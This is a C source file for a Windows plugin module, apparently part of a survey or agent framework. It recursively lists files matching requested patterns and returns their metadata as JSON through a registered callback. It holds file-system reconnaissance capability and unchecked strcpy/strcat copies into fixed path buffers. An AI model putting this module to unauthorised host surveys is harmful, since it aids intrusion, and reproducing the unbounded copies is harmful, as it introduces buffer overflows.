#include <windows.h>
#include <stdio.h>

#pragma message( "Compiling with DEBUGGING messages hardcoded in " __FILE__ )
#define _VERBOSE
#define DEBUG_LEVEL DEBUG_VERBOSE
#include "DebugOutput.h"
#include "LIB_Utilities.h"
#include "cJSON.h"

#include "LIB_SurveyFile.h"
#include "Internal_Functions.h"


// Global variables
cJSON* g_SurveyFile_lpJsonSurveyFileConfig = NULL;


DWORD WINAPI p_FileSearch(
	LPSTR	lpFileName,
	cJSON*	lpJsonOutputResults,
	BOOL	bRecursive
)
{
	DWORD	dwErrorCode			= ERROR_SUCCESS;
	DWORD	dwTempErrorCode		= ERROR_SUCCESS;

	HANDLE	hSearch				= INVALID_HANDLE_VALUE;
	WIN32_FIND_DATAA	_mFindFileData;
	LPWIN32_FIND_DATAA	lpFindFileData = &_mFindFileData;

	DWORD	dwDirectoryLength = MAX_PATH;
	CHAR	lpDirectory[MAX_PATH];
	LPSTR	lpSearchPattern = NULL;
	CHAR	lpNewFileName[MAX_PATH];


	__try
	{
		__try
		{
			if (NULL == lpFileName)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpFileName is null")
				);
				__leave;
			}
			if (NULL == lpJsonOutputResults)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonOutputResults is null")
				);
				__leave;
			}
			

			DBGPRINT(DEBUG_VERBOSE, TEXT("lpFileName:             %S"), lpFileName);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonOutputResults:    %p"), lpJsonOutputResults);
			DBGPRINT(DEBUG_VERBOSE, TEXT("bRecursive:             %08x"), bRecursive);


			// Get the directory to search and the search pattern to use
			ZeroMemory(lpDirectory,	MAX_PATH);
			ZeroMemory(lpNewFileName, MAX_PATH);
			dwDirectoryLength = m_SurveyFile_GetFullPathNameA(lpFileName, MAX_PATH, lpDirectory, &lpSearchPattern);
			if (0 == dwDirectoryLength)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_SurveyFile_GetFullPathNameA( %p, %d, %p, %p ) failed.(%08x)"),
					lpFileName, MAX_PATH, lpDirectory, &lpSearchPattern,
					dwErrorCode
				);
				__leave;
			}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("lpDirectory:            %p"), lpDirectory);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("lpDirectory:            %S"), lpDirectory);
			if (NULL!= lpSearchPattern)
			{
				//DBGPRINT(DEBUG_VERBOSE, TEXT("lpSearchPattern:        %p"), lpSearchPattern);
				//DBGPRINT(DEBUG_VERBOSE, TEXT("lpSearchPattern:        %S"), lpSearchPattern);
				lpSearchPattern[-1] = '\0';
				//DBGPRINT(DEBUG_VERBOSE, TEXT("lpDirectory:            %S"), lpDirectory);
			}


			// Find the first file matching the search pattern in the search directory
			ZeroMemory(lpFindFileData, sizeof(WIN32_FIND_DATAA));
			hSearch = m_SurveyFile_FindFirstFileA(lpFileName, lpFindFileData);
			if (INVALID_HANDLE_VALUE == hSearch)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_SurveyFile_FindFirstFileA( %p, %p ) failed.(%08x)"),
					lpFileName,
					lpFindFileData,
					dwErrorCode
				);
				__leave;
			}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("hSearch:            %p"), hSearch);
			// Loop through the search results
			do
			{
				//DBGPRINT(DEBUG_VERBOSE, TEXT("lpFindFileData->dwFileAttributes:   %08x"), lpFindFileData->dwFileAttributes);
				//DBGPRINT(DEBUG_VERBOSE, TEXT("lpFindFileData->cFileName:          \"%S\""), lpFindFileData->cFileName);

				// If the current result is a directory, and we are set to recurse, then recurse
				if (lpFindFileData->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					if (
						(TRUE == bRecursive) &&
						(0 != strcmp("..", lpFindFileData->cFileName)) &&
						(0 != strcmp(".", lpFindFileData->cFileName))
						)
					{
						// Create the new sub-directory string
						// Repeat the same search pattern
						strcpy(lpNewFileName, lpDirectory);
						strcat(lpNewFileName, "\\");
						strcat(lpNewFileName, lpFindFileData->cFileName);
						strcat(lpNewFileName, "\\");
						strcat(lpNewFileName, lpSearchPattern);
						//DBGPRINT(DEBUG_VERBOSE, TEXT("Search sub-directory:  %S"), lpNewFileName);
						// Recurse
						dwErrorCode = p_FileSearch(lpNewFileName, lpJsonOutputResults, bRecursive);
					}
				}
				else // The result is not a directory, so append the file information to our output
				{
					DBGPRINT(DEBUG_VERBOSE, TEXT("Found: %S"), lpFindFileData->cFileName);
					
					cJSON*	lpJsonEntry = NULL;
					cJSON*	lpJsonDirectoryName = NULL;
					cJSON*	lpJsonFileName = NULL;
					cJSON*	lpJsonFileAttributes = NULL;
					cJSON*	lpJsonCreationTimeLow = NULL;
					cJSON*	lpJsonCreationTimeHigh = NULL;
					cJSON*	lpJsonLastAccessTimeLow = NULL;
					cJSON*	lpJsonLastAccessTimeHigh = NULL;
					cJSON*	lpJsonLastWriteTimeLow = NULL;
					cJSON*	lpJsonLastWriteTimeHigh = NULL;
					cJSON*	lpJsonFileSizeLow = NULL;
					cJSON*	lpJsonFileSizeHigh = NULL;

					lpJsonEntry = cJSON_CreateObject();
					if (NULL == lpJsonEntry)
					{
						dwErrorCode = ERROR_OBJECT_NOT_FOUND;
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("lpJsonEntry = cJSON_CreateObject() failed.\n")
						);
						__leave;
					}

					lpJsonDirectoryName = cJSON_CreateString(lpDirectory);
					if (NULL == lpJsonDirectoryName)
					{
						dwErrorCode = ERROR_OBJECT_NOT_FOUND;
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("lpJsonDirectoryName = cJSON_CreateString failed.\n")
						);
						__leave;
					}
					cJSON_AddItemToObject(lpJsonEntry, SurveyFile_Response_DirectoryName, lpJsonDirectoryName);

					lpJsonFileName = cJSON_CreateString(lpFindFileData->cFileName);
					if (NULL == lpJsonFileName)
					{
						dwErrorCode = ERROR_OBJECT_NOT_FOUND;
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("lpJsonFileName = cJSON_CreateString failed.\n")
						);
						__leave;
					}
					cJSON_AddItemToObject(lpJsonEntry, SurveyFile_Response_FileName, lpJsonFileName);

					lpJsonFileAttributes = cJSON_CreateNumber(lpFindFileData->dwFileAttributes);
					if (NULL == lpJsonFileAttributes)
					{
						dwErrorCode = ERROR_OBJECT_NOT_FOUND;
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("lpJsonFileAttributes = cJSON_CreateNumber failed.\n")
						);
						__leave;
					}
					cJSON_AddItemToObject(lpJsonEntry, SurveyFile_Response_FileAttributes, lpJsonFileAttributes);

					lpJsonCreationTimeLow = cJSON_CreateNumber(lpFindFileData->ftCreationTime.dwLowDateTime);
					if (NULL == lpJsonCreationTimeLow)
					{
						dwErrorCode = ERROR_OBJECT_NOT_FOUND;
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("lpJsonCreationTimeLow = cJSON_CreateNumber failed.\n")
						);
						__leave;
					}
					cJSON_AddItemToObject(lpJsonEntry, SurveyFile_Response_CreationTimeLow, lpJsonCreationTimeLow);

					lpJsonCreationTimeHigh = cJSON_CreateNumber(lpFindFileData->ftCreationTime.dwHighDateTime);
					if (NULL == lpJsonCreationTimeHigh)
					{
						dwErrorCode = ERROR_OBJECT_NOT_FOUND;
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("lpJsonCreationTimeHigh = cJSON_CreateNumber failed.\n")
						);
						__leave;
					}
					cJSON_AddItemToObject(lpJsonEntry, SurveyFile_Response_CreationTimeHigh, lpJsonCreationTimeHigh);

					lpJsonLastWriteTimeLow = cJSON_CreateNumber(lpFindFileData->ftLastWriteTime.dwLowDateTime);
					if (NULL == lpJsonLastWriteTimeLow)
					{
						dwErrorCode = ERROR_OBJECT_NOT_FOUND;
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("lpJsonLastWriteTimeLow = cJSON_CreateNumber failed.\n")
						);
						__leave;
					}
					cJSON_AddItemToObject(lpJsonEntry, SurveyFile_Response_LastWriteTimeLow, lpJsonLastWriteTimeLow);

					lpJsonLastWriteTimeHigh = cJSON_CreateNumber(lpFindFileData->ftLastWriteTime.dwHighDateTime);
					if (NULL == lpJsonLastWriteTimeHigh)
					{
						dwErrorCode = ERROR_OBJECT_NOT_FOUND;
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("lpJsonLastWriteTimeHigh = cJSON_CreateNumber failed.\n")
						);
						__leave;
					}
					cJSON_AddItemToObject(lpJsonEntry, SurveyFile_Response_LastWriteTimeHigh, lpJsonLastWriteTimeHigh);

					lpJsonLastAccessTimeLow = cJSON_CreateNumber(lpFindFileData->ftLastAccessTime.dwLowDateTime);
					if (NULL == lpJsonLastAccessTimeLow)
					{
						dwErrorCode = ERROR_OBJECT_NOT_FOUND;
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("lpJsonLastAccessTimeLow = cJSON_CreateNumber failed.\n")
						);
						__leave;
					}
					cJSON_AddItemToObject(lpJsonEntry, SurveyFile_Response_LastAccessTimeLow, lpJsonLastAccessTimeLow);

					lpJsonLastAccessTimeHigh = cJSON_CreateNumber(lpFindFileData->ftLastAccessTime.dwHighDateTime);
					if (NULL == lpJsonLastAccessTimeHigh)
					{
						dwErrorCode = ERROR_OBJECT_NOT_FOUND;
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("lpJsonLastAccessTimeHigh = cJSON_CreateNumber failed.\n")
						);
						__leave;
					}
					cJSON_AddItemToObject(lpJsonEntry, SurveyFile_Response_LastAccessTimeHigh, lpJsonLastAccessTimeHigh);

					lpJsonFileSizeLow = cJSON_CreateNumber(lpFindFileData->nFileSizeLow);
					if (NULL == lpJsonFileSizeLow)
					{
						dwErrorCode = ERROR_OBJECT_NOT_FOUND;
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("lpJsonFileSizeLow = cJSON_CreateNumber failed.\n")
						);
						__leave;
					}
					cJSON_AddItemToObject(lpJsonEntry, SurveyFile_Response_FileSizeLow, lpJsonFileSizeLow);

					lpJsonFileSizeHigh = cJSON_CreateNumber(lpFindFileData->nFileSizeHigh);
					if (NULL == lpJsonFileSizeHigh)
					{
						dwErrorCode = ERROR_OBJECT_NOT_FOUND;
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("lpJsonFileSizeHigh = cJSON_CreateNumber failed.\n")
						);
						__leave;
					}
					cJSON_AddItemToObject(lpJsonEntry, SurveyFile_Response_FileSizeHigh, lpJsonFileSizeHigh);

					// Add current entry to overall results list
					cJSON_AddItemToArray(lpJsonOutputResults, lpJsonEntry);

				} // end else the result is not a directory, so append the file information to our output

			} while (TRUE == m_SurveyFile_FindNextFileA(hSearch, lpFindFileData));

		} // end try-finally
		__finally
		{
			if (INVALID_HANDLE_VALUE != hSearch)
			{
				if (FALSE == m_SurveyFile_FindClose(hSearch))
				{
					dwTempErrorCode = GetLastError();
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("FindClose( %p ) failed.(%08x)"),
						hSearch,
						dwTempErrorCode
					);
				}
				hSearch = INVALID_HANDLE_VALUE;
			}

			//DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI SurveyFileInitialization(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	cJSON*	lpJsonSurveyFileInitializeInput = NULL;

	BOOL	bRegisterResult = FALSE;

	PBYTE	pBuffer = NULL;
	int		nBufferSize = 0;

	cJSON*	lpJsonSurveyFileInitializeOutput = NULL;
	CHAR*	szSurveyFileOutput = NULL;
	DWORD	dwSurveyFileOutputSize = 0;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			//if (NULL == lppOutputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lppOutputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}


			/********************************************************************************
				Convert input string into JSON
			********************************************************************************/
			lpJsonSurveyFileInitializeInput = cJSON_Parse((CHAR*)lpInputBuffer);
			if (NULL == lpJsonSurveyFileInitializeInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					(CHAR*)lpInputBuffer
				);
				__leave;
			}

			// Set the local module's configuration to the input configuration
			g_SurveyFile_lpJsonSurveyFileConfig = lpJsonSurveyFileInitializeInput;
			// and then null the input configuration so it isn't free'd in the finally
			lpJsonSurveyFileInitializeInput = NULL;


			/********************************************************************************
				Initialize internal functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Initialize_SurveyFile_Kernel32_Functions()"));
			dwErrorCode = Initialize_SurveyFile_Kernel32_Functions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("Initialize_SurveyFile_Kernel32_Functions() failed.(%08x)"), dwErrorCode);
				__leave;
			}


			/********************************************************************************
				Perform additional initialization actions
			********************************************************************************/


			/********************************************************************************
				Register callback functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Register SurveyFile_Request"));
			bRegisterResult = RegisterModuleMessageHandler(
				g_SurveyFile_lpJsonSurveyFileConfig,
				SurveyFile_Request,
				SurveyFileCallbackInterface
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("RegisterModuleMessageHandler(%p, %S, %p) failed."),
					g_SurveyFile_lpJsonSurveyFileConfig,
					SurveyFile_Request,
					SurveyFileCallbackInterface
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Register SurveyFile_Request was successful."));
			}


			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			//szSurveyFileOutput = cJSON_Print(lpJsonSurveyFileInitializeOutput);
			//if (NULL == szSurveyFileOutput)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("cJSON_Print(%p) failed."),
			//		lpJsonSurveyFileInitializeOutput
			//	);
			//	__leave;
			//}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szSurveyFileOutput:     %p"), szSurveyFileOutput);
			////printf("szSurveyFileOutput:\n%s\n", szSurveyFileOutput);
			//dwSurveyFileOutputSize = (DWORD)strlen(szSurveyFileOutput);

			//(*lppOutputBuffer) = (LPBYTE)szSurveyFileOutput;
			//(*lpdwOutputBufferSize) = dwSurveyFileOutputSize;
			
		} // end try-finally
		__finally
		{
			// Delete input and output JSON objects
			if (NULL != lpJsonSurveyFileInitializeInput)
			{
				cJSON_Delete(lpJsonSurveyFileInitializeInput);
				lpJsonSurveyFileInitializeInput = NULL;
			}
			if (NULL != lpJsonSurveyFileInitializeOutput)
			{
				cJSON_Delete(lpJsonSurveyFileInitializeOutput);
				lpJsonSurveyFileInitializeOutput = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI SurveyFileFinalization(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szSurveyFileInput = NULL;
	DWORD	dwSurveyFileInputSize = 0;
	cJSON*	lpJsonInput = NULL;
	cJSON*	lpJsonMessageType = NULL;

	BOOL	bRegisterResult = FALSE;

	PBYTE	pBuffer = NULL;
	int		nBufferSize = 0;

	CHAR*	szSurveyFileOutput = NULL;
	DWORD	dwSurveyFileOutputSize = 0;
	cJSON*	lpJsonSurveyFileOutput = NULL;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			//if (NULL == lppOutputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lppOutputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//if (NULL == lpInputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpInputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//szSurveyFileInput = (char*)lpInputBuffer;
			//dwSurveyFileInputSize = dwInputBufferSize;


			/********************************************************************************
				Unregister callback functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister SurveyFile_Request"));
			bRegisterResult = UnregisterModuleMessageHandler(
				g_SurveyFile_lpJsonSurveyFileConfig,
				SurveyFile_Request
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("UnregisterModuleMessageHandler(%p, %S) failed."),
					g_SurveyFile_lpJsonSurveyFileConfig,
					SurveyFile_Request
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister SurveyFile_Request was successful."));
			}


			/********************************************************************************
				Perform additional Finalization actions
			********************************************************************************/


			/********************************************************************************
				Finalize internal functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Finalize_SurveyFile_Kernel32_Functions()"));
			dwErrorCode = Finalize_SurveyFile_Kernel32_Functions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("Finalize_SurveyFile_Kernel32_Functions() failed.(%08x)"), dwErrorCode);
				__leave;
			}

			
		} // end try-finally
		__finally
		{
			/********************************************************************************
				Delete local JSON config
			********************************************************************************/
			if (NULL != g_SurveyFile_lpJsonSurveyFileConfig)
			{
				cJSON_Delete(g_SurveyFile_lpJsonSurveyFileConfig);
				g_SurveyFile_lpJsonSurveyFileConfig = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI SurveyFileCallbackInterface(
	IN LPBYTE	lpInputBuffer,
	IN DWORD	dwInputBufferSize,
	OUT LPBYTE* lppOutputBuffer,
	OUT LPDWORD lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szSurveyFileInput = NULL;
	DWORD	dwSurveyFileInputSize = 0;
	cJSON*	lpJsonInput = NULL;
	cJSON*	lpJsonSurveyFileRequestEntries = NULL;
	cJSON*	lpJsonSurveyFileRequestEntry = NULL;

	CHAR*	szSurveyFileOutput = NULL;
	DWORD	dwSurveyFileOutputSize = 0;
	cJSON*	lpJsonSurveyFileOutput = NULL;
	//cJSON*	lpJsonSurveyFileResponse = NULL;
	cJSON*	lpJsonSurveyFileResponseResults = NULL;

	DWORD	dwRequestIndex = 0;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);


			/********************************************************************************
				Check arguments
			********************************************************************************/
			if (NULL == lppOutputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lppOutputBuffer is NULL.\n")
				);
				__leave;
			}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}
			szSurveyFileInput = (char*)lpInputBuffer;
			dwSurveyFileInputSize = dwInputBufferSize;


			/********************************************************************************
				Check input for new configuration
			********************************************************************************/
			lpJsonInput = cJSON_Parse(szSurveyFileInput);
			if (NULL == lpJsonInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					lpInputBuffer
				);
				__leave;
			}


			/********************************************************************************
				Create the output JSON object
			********************************************************************************/
			// Create the output JSON object
			lpJsonSurveyFileOutput = cJSON_CreateObject();
			if (NULL == lpJsonSurveyFileOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonSurveyFileOutput = cJSON_CreateObject failed.\n")
				);
				__leave;
			}

			//// Create the SurveyFile_Response JSON object
			//lpJsonSurveyFileResponse = cJSON_AddObjectToObject(lpJsonSurveyFileOutput, SurveyFile_Response);
			//if (NULL == lpJsonSurveyFileResponse)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpJsonSurveyFileResponse = cJSON_AddObjectToObject(%p, %S) failed.\n"),
			//		lpJsonSurveyFileOutput, SurveyFile_Response
			//	);
			//	__leave;
			//}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonSurveyFileResponse:    %p"), lpJsonSurveyFileResponse);

			// Create an array of SurveyFile_Registry_Results JSON objects
			lpJsonSurveyFileResponseResults = cJSON_AddArrayToObject(lpJsonSurveyFileOutput, SurveyFile_Response_Results);
			if (NULL == lpJsonSurveyFileResponseResults)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonSurveyFileResponseResults = cJSON_AddArrayToObject(%p,%S) failed."),
					lpJsonSurveyFileOutput,
					SurveyFile_Response_Results
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonSurveyFileResponseResults:    %p"), lpJsonSurveyFileResponseResults);


			/********************************************************************************
				Perform action given input parameters
			********************************************************************************/
			// Get the array of SurveyFile_Registry_Entries
			lpJsonSurveyFileRequestEntries = cJSON_GetObjectItemCaseSensitive(lpJsonInput, SurveyFile_Request_Entries);
			if (NULL == lpJsonSurveyFileRequestEntries)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonInput,
					SurveyFile_Request_Entries
				);
				__leave;
			}
			// Loop through each request entry and perform the actual request
			dwRequestIndex = 0;
			cJSON_ArrayForEach(lpJsonSurveyFileRequestEntry, lpJsonSurveyFileRequestEntries)
			{
				LPSTR	szEntry = NULL;
				DWORD	dwExpandedEntrySize = MAX_PATH + 1;
				CHAR	szExpandedEntry[MAX_PATH + 1];

				// Make sure that the request entry JSON object is a string
				if (
					!cJSON_IsString(lpJsonSurveyFileRequestEntry) ||
					(NULL == lpJsonSurveyFileRequestEntry->valuestring)
					)
				{
					DBGPRINT(
						DEBUG_WARNING,
						TEXT("cJSON_IsString(%p) failed."),
						lpJsonSurveyFileRequestEntry
					);
					continue;
				}
					

				szEntry = lpJsonSurveyFileRequestEntry->valuestring;
				DBGPRINT(DEBUG_VERBOSE, TEXT("%S[%d]: %S"), SurveyFile_Request_Entries, dwRequestIndex, szEntry);


				ZeroMemory(szExpandedEntry, dwExpandedEntrySize);
				dwExpandedEntrySize = ExpandEnvironmentStringsA(szEntry, szExpandedEntry, dwExpandedEntrySize);
				if (0 == dwExpandedEntrySize)
				{
					dwErrorCode = GetLastError();
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("ExpandEnvironmentStringsA( %p, %p, %d ) failed.(%08x)"),
						szEntry,
						szExpandedEntry,
						MAX_PATH,
						dwErrorCode
					);
					__leave;
				}

				DBGPRINT(DEBUG_VERBOSE, TEXT("szExpandedEntry: %S"), szExpandedEntry);

				if ('\\' == szExpandedEntry[dwExpandedEntrySize - 2])
				{
					szExpandedEntry[dwExpandedEntrySize-1] = '*';
					DBGPRINT(DEBUG_VERBOSE, TEXT("List contents of directory"));
					dwErrorCode = p_FileSearch(szExpandedEntry, lpJsonSurveyFileResponseResults, FALSE);
					if (ERROR_SUCCESS != dwErrorCode)
					{
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("p_FileSearch( %p, %p, %d ) failed.(%08x)"),
							szExpandedEntry, lpJsonSurveyFileResponseResults, FALSE,
							dwErrorCode
						);
						__leave;
					}
				}
				else
				{
					DBGPRINT(DEBUG_VERBOSE, TEXT("Search using pattern"));
					dwErrorCode = p_FileSearch(szExpandedEntry, lpJsonSurveyFileResponseResults, TRUE);
					if (ERROR_SUCCESS != dwErrorCode)
					{
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("p_FileSearch( %p, %p, %d ) failed.(%08x)"),
							szExpandedEntry, lpJsonSurveyFileResponseResults, FALSE,
							dwErrorCode
						);
						__leave;
					}
				}
			} // end cJSON_ArrayForEach(lpJsonSurveyFileRequestEntry, lpJsonRequestEntries)


			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			szSurveyFileOutput = cJSON_Print(lpJsonSurveyFileOutput);
			if (NULL == szSurveyFileOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Print(%p) failed."),
					lpJsonSurveyFileOutput
				);
				__leave;
			}
			dwSurveyFileOutputSize = (DWORD)strlen(szSurveyFileOutput);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("dwSurveyFileOutputSize: %d"), dwSurveyFileOutputSize);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szSurveyFileOutput:     %p"), szSurveyFileOutput);
			//printf("szSurveyFileOutput:\n%s\n", szSurveyFileOutput);

			(*lppOutputBuffer) = (LPBYTE)szSurveyFileOutput;
			(*lpdwOutputBufferSize) = dwSurveyFileOutputSize;

		} // end try-finally
		__finally
		{
			if (NULL != lpJsonInput)
			{
				cJSON_Delete(lpJsonInput);
				lpJsonInput = NULL;
			}

			if (NULL != lpJsonSurveyFileOutput)
			{
				cJSON_Delete(lpJsonSurveyFileOutput);
				lpJsonSurveyFileOutput = NULL;
			}

			if (ERROR_SUCCESS != dwErrorCode)
			{
				if (NULL != (*lppOutputBuffer))
				{
					//dwTempErrorCode = FREE(*lppOutputBuffer);
					//if (ERROR_SUCCESS != dwTempErrorCode)
					//{
					//	DBGPRINT(DEBUG_ERROR, TEXT("FREE failed.(%08x)"), dwTempErrorCode);
					//}

					cJSON_free(szSurveyFileOutput);
					*lppOutputBuffer = NULL;
				}
				*lpdwOutputBufferSize = 0;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


